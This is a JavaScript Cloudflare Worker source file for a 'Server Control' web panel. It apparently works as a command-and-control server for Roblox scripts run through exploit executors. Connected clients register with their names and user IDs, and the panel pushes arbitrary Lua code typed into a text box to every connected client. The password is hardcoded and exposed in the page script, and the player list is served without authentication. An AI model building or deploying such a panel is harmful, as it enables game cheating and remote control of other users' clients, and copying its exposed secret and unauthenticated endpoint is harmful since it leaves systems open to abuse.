// server.js - SIMPLE WORKING WEB PAGE

const players = new Map();

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const SECRET_KEY = env.SECRET_KEY || "MewVantaIsTheBest";

    // ─── WEBSOCKET ───
    if (url.pathname === '/ws') {
      const upgrade = request.headers.get('Upgrade');
      if (upgrade !== 'websocket') {
        return new Response('Expected Upgrade: websocket', { status: 426 });
      }

      const [client, server] = Object.values(new WebSocketPair());
      server.accept();

      console.log('✅ Client connected!');

      let playerId = null;

      server.addEventListener('message', (event) => {
        try {
          const data = JSON.parse(event.data);
          console.log('📩 Received:', data.type);

          if (data.type === 'player_info') {
            const info = data.data;
            playerId = info.userId || crypto.randomUUID();

            players.set(playerId, {
              name: info.name || 'Unknown',
              userId: playerId,
              executor: info.executor || 'Unknown',
              isOwner: info.isOwner || false,
              connectedAt: new Date().toISOString(),
              ws: server
            });

            console.log(`👤 Player stored: ${info.name}`);
            console.log(`📊 Total players: ${players.size}`);

            server.send(JSON.stringify({
              type: 'player_info_received',
              data: {
                message: `Welcome ${info.name}!`
              }
            }));
            return;
          }

          server.send(JSON.stringify({
            type: 'echo',
            data: data
          }));

        } catch (err) {
          console.log('📩 Plain message:', event.data);
          server.send(`Echo: ${event.data}`);
        }
      });

      server.addEventListener('close', () => {
        if (playerId) {
          players.delete(playerId);
          console.log(`📊 Total players: ${players.size}`);
        }
      });

      return new Response(null, { status: 101, webSocket: client });
    }

    // ─── API: GET PLAYERS ───
    if (url.pathname === '/api/players') {
      const list = [];
      for (const [id, player] of players) {
        list.push({
          name: player.name,
          userId: player.userId,
          executor: player.executor,
          isOwner: player.isOwner || false,
          connectedAt: player.connectedAt
        });
      }
      return new Response(JSON.stringify(list), {
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // ─── API: EXECUTE ───
    if (url.pathname === '/api/execute' && request.method === 'POST') {
      try {
        const body = await request.json();
        const { code, password } = body;

        if (!password || password !== SECRET_KEY) {
          return new Response(JSON.stringify({ 
            success: false, 
            message: 'Invalid password!' 
          }), {
            status: 401,
            headers: { 'Content-Type': 'application/json' }
          });
        }

        if (!code || code.trim() === '') {
          return new Response(JSON.stringify({ 
            success: false, 
            message: 'Code required!' 
          }), {
            status: 400,
            headers: { 'Content-Type': 'application/json' }
          });
        }

        let sent = 0;
        for (const [id, data] of players) {
          try {
            if (data.ws) {
              data.ws.send(code);
              sent++;
            }
          } catch (err) {}
        }

        return new Response(JSON.stringify({ 
          success: true, 
          message: `✅ Code sent to ${sent} players!` 
        }), {
          headers: { 'Content-Type': 'application/json' }
        });

      } catch (err) {
        return new Response(JSON.stringify({ 
          success: false, 
          message: 'Error: ' + err.message 
        }), {
          status: 500,
          headers: { 'Content-Type': 'application/json' }
        });
      }
    }

    // ─── API: PRINT ───
    if (url.pathname === '/api/print' && request.method === 'POST') {
      try {
        const body = await request.json();
        const { password } = body;

        if (!password || password !== SECRET_KEY) {
          return new Response(JSON.stringify({ 
            success: false, 
            message: 'Invalid password!' 
          }), {
            status: 401,
            headers: { 'Content-Type': 'application/json' }
          });
        }

        let sent = 0;
        for (const [id, data] of players) {
          try {
            if (data.ws) {
              data.ws.send("print");
              sent++;
            }
          } catch (err) {}
        }

        return new Response(JSON.stringify({ 
          success: true, 
          message: `✅ "print" sent to ${sent} players!` 
        }), {
          headers: { 'Content-Type': 'application/json' }
        });

      } catch (err) {
        return new Response(JSON.stringify({ 
          success: false, 
          message: 'Error: ' + err.message 
        }), {
          status: 500,
          headers: { 'Content-Type': 'application/json' }
        });
      }
    }

    // ─── API: ALL ───
    if (url.pathname === '/api/all' && request.method === 'POST') {
      try {
        const body = await request.json();
        const { password } = body;

        if (!password || password !== SECRET_KEY) {
          return new Response(JSON.stringify({ 
            success: false, 
            message: 'Invalid password!' 
          }), {
            status: 401,
            headers: { 'Content-Type': 'application/json' }
          });
        }

        let sent = 0;
        for (const [id, data] of players) {
          try {
            if (data.ws) {
              data.ws.send("all");
              sent++;
            }
          } catch (err) {}
        }

        return new Response(JSON.stringify({ 
          success: true, 
          message: `✅ "all" sent to ${sent} players!` 
        }), {
          headers: { 'Content-Type': 'application/json' }
        });

      } catch (err) {
        return new Response(JSON.stringify({ 
          success: false, 
          message: 'Error: ' + err.message 
        }), {
          status: 500,
          headers: { 'Content-Type': 'application/json' }
        });
      }
    }

    // ─── API: KICK ───
    if (url.pathname === '/api/kick' && request.method === 'POST') {
      try {
        const body = await request.json();
        const { playerName, password } = body;

        if (!password || password !== SECRET_KEY) {
          return new Response(JSON.stringify({ 
            success: false, 
            message: 'Invalid password!' 
          }), {
            status: 401,
            headers: { 'Content-Type': 'application/json' }
          });
        }

        if (!playerName) {
          return new Response(JSON.stringify({ 
            success: false, 
            message: 'Player name required!' 
          }), {
            status: 400,
            headers: { 'Content-Type': 'application/json' }
          });
        }

        let targetId = null;
        let targetWs = null;
        let targetName = null;

        for (const [id, data] of players) {
          if (data.name === playerName) {
            targetId = id;
            targetWs = data.ws;
            targetName = data.name;
            break;
          }
        }

        if (!targetWs) {
          return new Response(JSON.stringify({ 
            success: false, 
            message: `Player "${playerName}" not found!` 
          }), {
            status: 404,
            headers: { 'Content-Type': 'application/json' }
          });
        }

        try {
          targetWs.send(JSON.stringify({
            type: 'kick',
            data: {
              message: 'You have been kicked by the server owner!'
            }
          }));
        } catch (err) {}

        players.delete(targetId);

        return new Response(JSON.stringify({ 
          success: true, 
          message: `✅ Kicked: ${targetName}` 
        }), {
          headers: { 'Content-Type': 'application/json' }
        });

      } catch (err) {
        return new Response(JSON.stringify({ 
          success: false, 
          message: 'Error: ' + err.message 
        }), {
          status: 500,
          headers: { 'Content-Type': 'application/json' }
        });
      }
    }

    // ─── SIMPLE WEB PAGE ───
    return new Response(`<!DOCTYPE html>
<html>
<head>
  <title>Server Control</title>
  <style>
    body { background: #0d0d1a; color: #e0e0e0; font-family: Arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
    .container { background: #1a1a2e; padding: 30px; border-radius: 20px; max-width: 600px; width: 100%; }
    h1 { color: #a78bfa; }
    .status { background: #22c55e; color: #fff; padding: 4px 16px; border-radius: 20px; display: inline-block; }
    .url-box { background: #0d0d1a; padding: 10px; border-radius: 8px; margin: 10px 0; border: 1px solid #2d2d44; }
    .url-box code { color: #fbbf24; }
    .player { background: #0d0d1a; padding: 10px; border-radius: 8px; margin: 5px 0; border-left: 3px solid #4ade80; }
    .empty { color: #6b7280; text-align: center; padding: 20px; }
    .stats { display: flex; gap: 20px; margin: 15px 0; }
    .stat-box { background: #0d0d1a; padding: 12px; border-radius: 10px; text-align: center; border: 1px solid #2d2d44; flex: 1; }
    .stat-box .num { font-size: 24px; font-weight: bold; color: #a78bfa; }
    .stat-box .label { font-size: 12px; color: #6b7280; }
    .btn-row { display: flex; gap: 10px; margin: 15px 0; flex-wrap: wrap; }
    .btn-row button { padding: 10px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 14px; font-weight: bold; flex: 1; min-width: 80px; }
    .btn-execute { background: #22c55e; color: #fff; }
    .btn-print { background: #3b82f6; color: #fff; }
    .btn-all { background: #8b5cf6; color: #fff; }
    .btn-kick { background: #ef4444; color: #fff; }
    .footer { margin-top: 20px; font-size: 12px; color: #4b5563; text-align: center; }
    .toast {
      position: fixed; top: 20px; right: 20px; background: #1a1a2e; padding: 16px 24px; border-radius: 12px; border: 1px solid #2d2d44; z-index: 999;
    }
    .toast.success { border-color: #22c55e; }
    .toast.error { border-color: #ef4444; }
  </style>
</head>
<body>
  <div class="container">
    <h1>⚡ Server Control</h1>
    <p><span class="status">● Online</span></p>
    <div class="url-box"><code>wss://zlfinder-websocket.noahchico52.workers.dev/ws</code></div>

    <div class="stats">
      <div class="stat-box"><div class="num" id="playerCount">0</div><div class="label">👥 Players</div></div>
      <div class="stat-box"><div class="num" id="ownerStatus">-</div><div class="label">👑 Owner</div></div>
    </div>

    <div id="playerList"><div class="empty">Loading...</div></div>

    <h3 style="color: #9ca3af; margin: 10px 0;">📝 Enter Lua Code:</h3>
    <textarea id="codeInput" style="width:100%;height:120px;background:#0d0d1a;color:#e0e0e0;border:1px solid #2d2d44;border-radius:8px;padding:10px;font-family:monospace;font-size:14px;">print("Hello from web!")</textarea>

    <div class="btn-row">
      <button class="btn-execute" onclick="sendCode()">▶️ Execute</button>
      <button class="btn-print" onclick="sendPrint()">🖨️ Print</button>
      <button class="btn-all" onclick="sendAll()">📢 All</button>
      <button class="btn-kick" onclick="sendKick()">👢 Kick</button>
    </div>

    <div class="footer">🔌 Connect your Roblox script to the URL above</div>
  </div>

  <div id="toastContainer"></div>

  <script>
    const PASSWORD = "MewVantaIsTheBest";

    async function fetchPlayers() {
      try {
        const res = await fetch('/api/players');
        const data = await res.json();
        console.log('📊 Data:', data);
        document.getElementById('playerCount').textContent = data.length;
        const owner = data.find(p => p.isOwner);
        document.getElementById('ownerStatus').textContent = owner ? owner.name : 'None';

        const list = document.getElementById('playerList');
        if (data.length === 0) {
          list.innerHTML = '<div class="empty">No players connected</div>';
          return;
        }
        list.innerHTML = data.map(p => \`
          <div class="player">👤 \${p.name} \${p.isOwner ? '👑' : ''} 🆔 \${p.userId} ⚡ \${p.executor}</div>
        \`).join('');
      } catch(e) { console.error('Fetch error:', e); }
    }

    async function sendCode() {
      const code = document.getElementById('codeInput').value;
      if (!code) return showToast('❌ Enter code!', 'error');
      const password = prompt('Enter password:');
      if (!password) return;
      try {
        const res = await fetch('/api/execute', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code, password })
        });
        const data = await res.json();
        showToast(data.message, res.ok ? 'success' : 'error');
      } catch(e) { showToast('❌ Error', 'error'); }
    }

    async function sendPrint() {
      const password = prompt('Enter password:');
      if (!password) return;
      try {
        const res = await fetch('/api/print', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ password })
        });
        const data = await res.json();
        showToast(data.message, res.ok ? 'success' : 'error');
      } catch(e) { showToast('❌ Error', 'error'); }
    }

    async function sendAll() {
      const password = prompt('Enter password:');
      if (!password) return;
      try {
        const res = await fetch('/api/all', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ password })
        });
        const data = await res.json();
        showToast(data.message, res.ok ? 'success' : 'error');
      } catch(e) { showToast('❌ Error', 'error'); }
    }

    async function sendKick() {
      const name = prompt('Enter player name:');
      if (!name) return;
      const password = prompt('Enter password:');
      if (!password) return;
      try {
        const res = await fetch('/api/kick', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ playerName: name, password })
        });
        const data = await res.json();
        showToast(data.message, res.ok ? 'success' : 'error');
        fetchPlayers();
      } catch(e) { showToast('❌ Error', 'error'); }
    }

    function showToast(message, type) {
      const container = document.getElementById('toastContainer');
      const toast = document.createElement('div');
      toast.className = 'toast ' + type;
      toast.textContent = message;
      container.appendChild(toast);
      setTimeout(() => toast.remove(), 3000);
    }

    fetchPlayers();
    setInterval(fetchPlayers, 3000);
  </script>
</body>
</html>`, {
      headers: { 'Content-Type': 'text/html; charset=UTF-8' }
    });
  }
};
